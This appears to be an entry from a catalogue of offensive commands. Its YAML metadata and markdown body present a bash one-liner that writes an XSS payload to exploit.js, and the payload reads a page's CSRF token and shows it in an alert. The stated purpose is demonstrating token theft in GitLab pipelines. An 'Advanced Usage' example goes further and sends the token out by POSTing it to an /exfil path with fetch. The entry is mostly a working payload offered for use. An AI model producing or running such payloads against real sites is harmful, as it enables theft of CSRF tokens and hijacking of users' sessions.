---
data: >-
  echo 'alert(parent.document.querySelector("meta[name=csrf-token]").outerHTML)'
  > exploit.js
tags:
  - javascript-generation
  - csrf-exploitation
type: command
output: >-
  File exploit.js containing:
  alert(parent.document.querySelector("meta[name=csrf-token]").outerHTML)
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.122Z'
id: 16ef2d93-fead-4e6c-8de6-559d73865400
verified: false
validated: true
submitted: true
---
# echo-csrf-alert

## Command

```bash
echo 'alert(parent.document.querySelector("meta[name=csrf-token]").outerHTML)' > exploit.js
```

## Description

This command generates a simple JavaScript file that, when executed in a browser context, queries for the CSRF token meta tag and alerts its outer HTML, useful for demonstrating token theft in XSS attacks within GitLab pipelines.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the provided string to stdout | Yes |
| `'alert(...) > exploit.js` | The JS payload string redirected to file | Yes |

## Examples

### Basic Usage

```bash
echo 'alert(parent.document.querySelector("meta[name=csrf-token]").outerHTML)' > exploit.js
```

### Advanced Usage

For more complex payloads, extend the echo string, e.g., to exfiltrate via fetch:

```bash
echo 'fetch("/exfil", {method:"POST", body:parent.document.querySelector("meta[name=csrf-token]").content})' > exploit.js
```

## Expected Output

Creates exploit.js file with the exact JS code: alert(parent.document.querySelector("meta[name=csrf-token]").outerHTML). No stdout unless redirection fails.

## Related

- [[Related Procedure: Generate-Exploit-JavaScript-Artifact-via-CI]]
